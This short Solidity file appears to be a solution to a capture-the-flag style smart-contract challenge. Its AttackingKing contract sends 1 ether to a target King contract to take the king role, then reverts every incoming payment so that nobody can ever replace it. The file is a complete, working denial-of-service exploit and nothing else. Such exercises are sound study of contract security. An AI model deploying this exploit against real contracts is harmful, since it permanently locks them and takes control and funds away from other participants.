// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Attacker become the King (assuming has enough funds for current prize)
        (bool success, ) = contractAddress.call{value: 1 ether}("");
        require(success);
    }

    receive() external payable {
        // Once attacker is the king, will revert
        // any attempt by others to become the new king
        revert("Sorry, you will never be the king");
    }
}
